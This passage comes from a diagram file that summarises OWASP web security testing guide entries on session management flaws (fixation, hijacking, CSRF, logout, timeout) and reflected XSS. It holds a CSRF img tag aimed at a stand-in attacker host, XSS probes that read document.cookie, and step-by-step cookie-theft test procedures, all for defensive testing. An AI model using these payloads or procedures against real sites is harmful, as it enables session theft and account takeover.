gzip&lt;br&gt;Content-length: 4090&lt;br&gt;Connection: close&lt;br&gt;Content-Type: text/html; charset=UTF-8&lt;br&gt;[...]&lt;br&gt;HTML data&lt;br&gt;[...]&lt;/i&gt;&lt;/p&gt;&lt;p&gt;It&#39;s possible to send a valid session identifier to a user (possibly using a social engineering trick), wait for them to authenticate, and subsequently verify that privileges have been assigned to this cookie.&lt;/p&gt;&lt;p&gt;Forced Cookies&lt;/p&gt;&lt;p&gt;Can&amp;nbsp;be applied to sites without full HSTS adoption (sites with full HSTS adoption are secure, since all their cookies have integrity).&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Reach the login page of the website.&lt;/li&gt;&lt;li&gt;Save a snapshot of the cookie jar before logging in, excluding cookies which contain the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;__Host-&lt;/i&gt; or &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;__Secure-&lt;/i&gt; prefix in their name.&lt;/li&gt;&lt;li&gt;Login to the website as the victim and reach any page offering a secure function requiring authentication.&lt;/li&gt;&lt;li&gt;Set the cookie jar to the snapshot taken at step 2.&lt;/li&gt;&lt;li&gt;Trigger the secure function identified at step 3.&lt;/li&gt;&lt;li&gt;Observe whether the operation at step 5 has been performed successfully. If so, the attack was successful.&lt;/li&gt;&lt;li&gt;Clear the cookie jar, login as the attacker and reach the page at step 3.&lt;/li&gt;&lt;li&gt;Write in the cookie jar, one by one, the cookies saved at step 2.&lt;/li&gt;&lt;li&gt;Trigger again the secure function identified at step 3.&lt;/li&gt;&lt;li&gt;Clear the cookie jar and login again as the victim.&lt;/li&gt;&lt;li&gt;Observe whether the operation at step 9 has been performed successfully in the victim’s account. If so, the attack was successful; otherwise, the site is secure against session fixation.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;/p&gt;&lt;div&gt;&lt;hr id=&quot;null&quot;&gt;&lt;/div&gt;&lt;p&gt;Implement a session token renewal after a user successfully authenticates.&lt;/p&gt;&lt;p&gt;The application should always first invalidate the existing session ID before authenticating a user, and if the authentication is successful, provide another session ID.&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="1460" width="400" x="2040" y="2400" as="geometry" />
        </mxCell>
        <mxCell id="0HfJOdexIH29PKX9WHf6-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;perimeter=rectanglePerimeter;fixDash=0;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-SESS-04&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Exposed Session Variables&lt;/h1&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Each time Session ID data is passed between the client and the server, the protocol, cache, and privacy directives and body should be examined.&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Ensure that proper encryption is implemented.&lt;/li&gt;&lt;li&gt;Review the caching configuration.&lt;/li&gt;&lt;li&gt;Assess the channel and methods’ security.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;Testing for Encryption &amp;amp; Reuse of Session Tokens Vulnerabilities&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;It should therefore be ensured that encryption is both the default and enforced for any request or response where the Session ID is passed, regardless of the mechanism used (e.g., a hidden form field) (check &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;https://&lt;/i&gt; -&amp;gt; &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://&lt;/i&gt;&lt;span&gt;, modify the form posts&lt;/span&gt;).&lt;/p&gt;&lt;p&gt;&lt;b&gt;Testing for Proxies &amp;amp; Caching Vulnerabilities&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;The application should also be configured to secure data in caches (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Cache-Control: no-cache&lt;/i&gt; (not &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Cache-Control: Private&lt;/i&gt;), &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Expires: 0&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Cache-Control: max-age=0&lt;/i&gt;).&lt;/p&gt;&lt;p&gt;&lt;b&gt;Testing for GET &amp;amp; POST Vulnerabilities&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;GET requests should not be used, as it&amp;nbsp;far more easily manipulated than other types of transport.&lt;/p&gt;&lt;p&gt;All server-side code receiving data from POST requests should be tested to ensure it does not accept the data if sent as a GET.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;POST /login.asp HTTP/1.1&lt;br&gt;Host: owaspapp.com&lt;br&gt;[...]&lt;br&gt;Cookie: ASPSESSIONIDABCDEFG=ASKLJDLKJRELKHJG&lt;br&gt;Content-Length: 51&lt;br&gt;&lt;b&gt;Login=Username&amp;amp;password=Password&amp;amp;SessionID=12345678&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;div&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;i&gt;http://owaspapp.com/login.asp?&lt;b&gt;Login=Username&amp;amp;password=Password&amp;amp;SessionID=12345678&lt;/b&gt;&lt;/i&gt;&lt;/span&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;Testing for Transport Vulnerabilities&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;How are Session IDs transferred? e.g., GET, POST, Form Field (including hidden fields)&lt;/li&gt;&lt;li&gt;Are Session IDs always sent over encrypted transport by default?&lt;/li&gt;&lt;li&gt;Is it possible to manipulate the application to send Session IDs unencrypted? e.g., by changing HTTP to HTTPS?&lt;/li&gt;&lt;li&gt;What cache-control directives are applied to requests/responses passing Session IDs?&lt;/li&gt;&lt;li&gt;Are these directives always present? If not, where are the exceptions?&lt;/li&gt;&lt;li&gt;Are GET requests incorporating the Session ID used?&lt;/li&gt;&lt;li&gt;If POST is used, can it be interchanged with GET?&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="900" width="400" x="2040" y="3860" as="geometry" />
        </mxCell>
        <mxCell id="I8xJygAHVS7wBTdlfGjH-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;perimeter=rectanglePerimeter;fixDash=0;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-SESS-05&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Cross Site Request Forgery&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://owasp.org/www-community/attacks/csrf&quot;&gt;CSRF&lt;/a&gt;&amp;nbsp;is an attack that forces an end user to execute unintended actions on a web application in which they are currently authenticated. It relies:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Web browser behavior regarding the handling of session-related information such as cookies and HTTP authentication information.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;An attacker’s knowledge of valid web application URLs, requests, or functionality.&lt;/li&gt;&lt;li&gt;Application session management relying only on information known by the browser.&lt;/li&gt;&lt;li&gt;Existence of HTML tags whose presence cause immediate access to an HTTP[S] resource; for example the image tag img.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;i&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ...&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;b&gt;&amp;lt;img src=&quot;https://attacker.site/action&quot; width=&quot;0&quot; height=&quot;0&quot;&amp;gt;&lt;/b&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ...&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/i&gt;&lt;/span&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Determine whether it is possible to initiate requests on a user’s behalf that are not initiated by the user.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Audit the application to ascertain if its session management is vulnerable (session management relies only on client-side values - cookies and HTTP authentication credentials).&lt;/p&gt;&lt;p&gt;Data manipulation via GET-requests is vulnerable.&lt;/p&gt;&lt;p&gt;Tools:&amp;nbsp;&lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html&quot;&gt;OWASP CSRF Prevention Cheat Sheet&lt;/a&gt;, &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://wiki.owasp.org/index.php/Category:OWASP_CSRFTester_Project&quot;&gt;CSRF Tester&lt;/a&gt;, &lt;a href=&quot;https://code.google.com/archive/p/pinata-csrf-tool/&quot;&gt;Pinata-CSRF-Tool&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="600" width="400" x="2040" y="4760" as="geometry" />
        </mxCell>
        <mxCell id="I8xJygAHVS7wBTdlfGjH-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;perimeter=rectanglePerimeter;fixDash=0;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-SESS-06&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Logout Functionality&lt;/h1&gt;&lt;p&gt;Session termination is an important part of the session lifecycle. Reducing to a minimum the lifetime of the session tokens decreases the likelihood of a successful session hijacking attack.&lt;br&gt;&lt;/p&gt;&lt;p&gt;A secure session termination requires at least the following components:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Availability of user interface controls that allow the user to manually log out.&lt;br&gt;&lt;/span&gt;Session termination after a given amount of time without activity (session timeout).&lt;br&gt;Proper invalidation of server-side session state.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Assess the logout UI.&lt;/li&gt;&lt;li&gt;Analyze the session timeout and if the session is properly killed after logout.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;Testing for Log Out User Interface&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Verify the appearance and visibility of the log out functionality in the user interface.&lt;/p&gt;&lt;p&gt;There are some properties which indicate a good log out user interface:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;A log out button is present on all pages of the web application.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;The log out button should be identified quickly by a user who wants to log out from the web application.&lt;/li&gt;&lt;li&gt;After loading a page the log out button should be visible without scrolling.&lt;/li&gt;&lt;li&gt;Ideally the log out button is placed in an area of the page that is fixed in the view port of the browser and not affected by scrolling of the content.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Testing for Server-Side Session Termination&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Store the values of cookies that are used to identify a session.&lt;/li&gt;&lt;li&gt;Invoke the log out function and observe the behavior of the application (especially regarding session cookies).&lt;br&gt;&lt;/li&gt;&lt;li&gt;Open a page that is only visible in an authenticated session.&lt;br&gt;&lt;/li&gt;&lt;li&gt;If the log out function causes session cookies to be set to a new value, restore the old value of the session cookies and reload a page from the authenticated area of the application.&lt;br&gt;&lt;/li&gt;&lt;li&gt;Check the availability of a authenticated page content.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Testing for Session Timeout&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Try to determine a session timeout by performing requests to a page in the authenticated area of the web application with increasing delays.&lt;/p&gt;&lt;p&gt;The proper value for the session timeout depends on the purpose of the application and should be a balance of security and usability.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Testing for Session Termination in Single Sign-On Environments (Single Sign-Off)&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Perform a log out in the tested application.&lt;/li&gt;&lt;li&gt;Verify if there is a central portal or application directory which allows the user to log back in to the application without authentication.&lt;/li&gt;&lt;li&gt;Test if the application requests the user to authenticate.&lt;/li&gt;&lt;li&gt;While logged in in the tested application, perform a log out in the SSO system.&lt;/li&gt;&lt;li&gt;Try to access an authenticated area of the tested application.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;An authentication of the user should be required to gain access to the application after log out in the SSO system and connected application.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://portswigger.net/burp/documentation/desktop/tools/repeater&quot;&gt;Burp Suite Repeater&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="1080" width="400" x="2040" y="5360" as="geometry" />
        </mxCell>
        <mxCell id="IHEKWDrpAqfZmFJUPOx4-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;perimeter=rectanglePerimeter;fixDash=0;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-SESS-07&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing Session Timeout&lt;/h1&gt;&lt;p&gt;All applications should implement an idle or inactivity timeout for sessions.&amp;nbsp;The most appropriate timeout should be a balance between security (shorter timeout) and usability (longer timeout) and heavily depends on the sensitivity level of the data handled by the application.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Validate that a hard session timeout exists.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;First, testers have to check whether a timeout exists, for instance, by logging in and waiting for the timeout log out to be triggered.&lt;/p&gt;&lt;p&gt;Then&amp;nbsp;understand whether the timeout is enforced by the client or by the server (or both):&lt;br&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;If the session cookie is non-persistent (or, more in general, the session cookie does not store any data about the time), testers can assume that the timeout is enforced by the server.&lt;br&gt;&lt;/li&gt;&lt;li&gt;If the session cookie contains some time related data (e.g., log in time, or last access time, or expiration date for a persistent cookie), then it’s possible that the client is involved in the timeout enforcing. Try to modify the cookie&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;As a general rule, everything should be checked server-side and it should not be possible, by re-setting the session cookies to previous values, to access the application again.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;The log out function effectively destroys all session token, or at least renders them unusable;&lt;/li&gt;&lt;li&gt;The server performs proper checks on the session state, disallowing an attacker to replay previously destroyed session identifiers;&lt;/li&gt;&lt;li&gt;A timeout is enforced and it is properly enforced by the server. If the server uses an expiration time that is read from a session token that is sent by the client (but this is not advisable), then the token must be cryptographically protected from tampering.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html&quot;&gt;OWASP&amp;nbsp;Session Management Cheat Sheet&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="640" width="400" x="2040" y="6440" as="geometry" />
        </mxCell>
        <mxCell id="IHEKWDrpAqfZmFJUPOx4-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;perimeter=rectanglePerimeter;fixDash=0;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-SESS-08&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Session Puzzling&lt;/h1&gt;&lt;p&gt;Session Variable Overloading (also known as Session Puzzling)&amp;nbsp;occurs when an application uses the same session variable for more than one purpose.&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set in one context and then used in another.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify all session variables.&lt;/li&gt;&lt;li&gt;Break the logical flow of session generation.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;This vulnerability can be detected and exploited by enumerating all of the session variables used by the application and in which context they are valid (&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;i&gt;A very simple example could be the password reset functionality that, in the entry point, could request the user to provide some identifying information such as the username or the email address. This page might then populate the session with these identifying values, which are received directly from the client-side, or obtained from queries or calculations based on the received input. At this point there may be some pages in the application that show private data based on this session object. In this manner the attacker could bypass the authentication process.&lt;/i&gt;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;The most effective way to detect these vulnerabilities is via a source code review.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Session variables should only be used for a single consistent purpose.&lt;/p&gt;&lt;p&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="480" width="400" x="2040" y="7080" as="geometry" />
        </mxCell>
        <mxCell id="IHEKWDrpAqfZmFJUPOx4-3" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;perimeter=rectanglePerimeter;fixDash=0;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-SESS-09&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Session Hijacking&lt;/h1&gt;&lt;p&gt;To prevent&amp;nbsp;session cookies unduly exposing&amp;nbsp;to the attacker over HTTP session cookies&amp;nbsp;should be marked with the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Secure&lt;/i&gt; attribute so that they are only communicated over HTTPS.&lt;/p&gt;&lt;p&gt;Note that the Secure attribute should also be used when the web application is entirely deployed over HTTPS, otherwise the following cookie theft attack is possible.&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;Assume that example.com is entirely deployed over HTTPS, but does not mark its session cookies as Secure. The following attack steps are possible:&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;The victim sends a request to &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://another-site.com&lt;/i&gt;.&lt;/li&gt;&lt;li&gt;The attacker corrupts the corresponding response so that it triggers a request to &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example.com&lt;/i&gt;.&lt;/li&gt;&lt;li&gt;The browser now tries to access &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example.com&lt;/i&gt;.&lt;/li&gt;&lt;li&gt;Though the request fails, the session cookies are leaked in the clear over HTTP.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Alternatively, session hijacking can be prevented by banning use of HTTP using HSTS.&amp;nbsp;Note that there is a subtlety here related to cookie scoping. In particular, full HSTS adoption is required when session cookies are issued with the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Domain&lt;/i&gt; attribute set.&lt;/p&gt;&lt;p&gt;Full HSTS adoption occurs when a host activates HSTS for itself and all its sub-domains. Partial HSTS adoption is when a host activates HSTS just for itself.&lt;/p&gt;&lt;p&gt;With the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Domain&lt;/i&gt; attribute set, session cookies can be shared across sub-domains. Use of HTTP with sub-domains should be avoided to prevent the disclosure of unencrypted cookies sent over HTTP.&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;assume that the website example.com activates HSTS without the includeSubDomains option. The website issues session cookies with the Domain attribute set to example.com. The following attack is possible:&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;The victim sends a request to &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://another-site.com&lt;/i&gt;.&lt;/li&gt;&lt;li&gt;The attacker corrupts the corresponding response so that it triggers a request to &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://fake.example.com&lt;/i&gt;.&lt;/li&gt;&lt;li&gt;The browser now tries to access &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://fake.example.com&lt;/i&gt;, which is permitted by the HSTS configuration.&lt;/li&gt;&lt;li&gt;Since the request is sent to a sub-domain of &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;example.com&lt;/i&gt; with the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Domain&lt;/i&gt; attribute set, it includes the session cookies, which are leaked in the clear over HTTP.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;Full HSTS should be activated on the apex domain to prevent this attack.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify vulnerable session cookies.&lt;/li&gt;&lt;li&gt;Hijack vulnerable cookies and assess the risk level.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;div&gt;&lt;hr id=&quot;null&quot;&gt;&lt;/div&gt;&lt;p&gt;We assume to have two testing accounts on the website under test, one to act as the victim and one to act as the attacker. We simulate a scenario where the attacker steals all the cookies which are not protected against disclosure over HTTP, and presents them to the website to access the victim’s account. If these cookies are enough to act on the victim’s behalf, session hijacking is possible.&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Login to the website as the victim and reach any page offering a secure function requiring authentication.&lt;/li&gt;&lt;li&gt;Delete from the cookie jar all the cookies which satisfy any of the following conditions.&lt;/li&gt;&lt;ul&gt;&lt;li&gt;in case there is no HSTS adoption: the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Secure&lt;/i&gt; attribute is set.&lt;/li&gt;&lt;li&gt;in case there is partial HSTS adoption: the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Secure&lt;/i&gt; attribute is set or the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Domain&lt;/i&gt; attribute is not set.&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;Save a snapshot of the cookie jar.&lt;/li&gt;&lt;li&gt;Trigger the secure function identified at step 1.&lt;/li&gt;&lt;li&gt;Observe whether the operation at step 4 has been performed successfully. If so, the attack was successful.&lt;/li&gt;&lt;li&gt;Clear the cookie jar, login as the attacker and reach the page at step 1.&lt;/li&gt;&lt;li&gt;Write in the cookie jar, one by one, the cookies saved at step 3.&lt;/li&gt;&lt;li&gt;Trigger again the secure function identified at step 1.&lt;/li&gt;&lt;li&gt;Clear the cookie jar and login again as the victim.&lt;/li&gt;&lt;li&gt;Observe whether the operation at step 8 has been performed successfully in the victim’s account. If so, the attack was successful; otherwise, the site is secure against session hijacking.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;We recommend using two different machines or browsers for the victim and the attacker. This allows you to decrease the number of false positives if the web application does fingerprinting to verify access enabled from a given cookie. A shorter but less precise variant of the testing strategy only requires one testing account. It follows the same pattern, but it halts at step 5 (note that this makes step 3 useless).&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://sourceforge.net/projects/jhijack/&quot;&gt;JHijack&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="1320" width="400" x="2040" y="7560" as="geometry" />
        </mxCell>
        <mxCell id="IHEKWDrpAqfZmFJUPOx4-4" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;perimeter=rectanglePerimeter;fixDash=0;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-01&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Reflected Cross Site Scripting&lt;/h1&gt;&lt;p&gt;Reflected Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response.&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Reflected XSS attack stages:&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;b&gt;Design&lt;/b&gt;&amp;nbsp;step - crafting and testing of an offending URI;&lt;br&gt;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;b&gt;Social engineering&lt;/b&gt;&amp;nbsp;step - convincing victims to load fake URI;&lt;br&gt;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;b&gt;Eventual execution&lt;/b&gt;&amp;nbsp;of the cradted code via the victim’s browser;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Use&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;JavaScript,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;ActionScript, VBScript and&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;other scripting languages.&lt;/span&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify variables that are reflected in responses.&lt;/li&gt;&lt;li&gt;Assess the input they accept and the encoding that gets applied on return (if any).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;div&gt;&lt;hr id=&quot;null&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;Detect Input Vectors&lt;/b&gt; -&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;determine all the web application’s user-defined variables and how to input them (&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;b&gt;Analyze Input Vectors&lt;/b&gt; -&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;use specially crafted input data (&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;typically harmless, but trigger responses from the web browser):&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;&lt;br&gt;&quot;&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;b&gt;Check Impact&lt;/b&gt; -&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;examining the resulting web page HTML and searching for the test input (idenify&amp;nbsp;&lt;/span&gt;special characters that were not properly encoded, replaced, or filtered out -&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;gt;&lt;/i&gt;, &lt;i 